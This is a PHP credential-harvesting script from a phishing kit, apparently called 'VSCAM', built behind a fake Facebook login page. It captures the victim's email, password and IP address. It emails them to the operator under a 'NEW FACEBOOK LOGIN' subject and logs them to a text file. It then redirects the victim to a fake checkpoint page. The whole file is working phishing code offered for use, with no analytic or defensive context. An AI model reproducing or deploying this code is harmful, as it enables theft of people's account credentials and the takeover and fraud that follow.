<?php
/* 
-                                                                                   
 ____      ____          ______        _____         _____        ______  _______   
|    |    |    |     ___|\     \   ___|\    \    ___|\    \      |      \/       \  
|    |    |    |    |    |\     \ /    /\    \  /    /\    \    /          /\     \ 
|    |    |    |    |    |/____/||    |  |    ||    |  |    |  /     /\   / /\     |
|    |    |    | ___|    \|   | ||    |  |____||    |__|    | /     /\ \_/ / /    /|
|    |    |    ||    \    \___|/ |    |   ____ |    .--.    ||     |  \|_|/ /    / |
|\    \  /    /||    |\     \    |    |  |    ||    |  |    ||     |       |    |  |
| \ ___\/___ / ||\ ___\|_____|   |\ ___\/    /||____|  |____||\____\       |____|  /
 \ |   ||   | / | |    |     |   | |   /____/ ||    |  |    || |    |      |    | / 
  \|___||___|/   \|____|_____|    \|___|    | /|____|  |____| \|____|      |____|/  
    \(    )/        \(    )/        \( |____|/   \(      )/      \(          )/     
     '    '          '    '          '   )/       '      '        '          '      
                                         '                                          */
#------------------------------[VSCAM - DETAILS]------------------------------#
  error_reporting(0);
  
$ip = getenv("REMOTE_ADDR");
include 'email.php';
$message .= "#--------------------------[ FACEBOOK LOGIN ]--------------------------#\n";
$message .= "USER ID        : ".$_POST['email']."\n";
$message .= "PASSWORD       : ".$_POST['pass']."\n";
$subject = "♊ NEW FACEBOOK LOGIN // ".$_POST['email']." // $ip";
$headers = "From: V-Scam ♊ <news@v-scam.cash>";
mail($SEND,$subject,$message,$headers);

$file = fopen("Tunisi.txt", 'a');
fwrite($file, $message);
header("location: checkpoint.php");
?>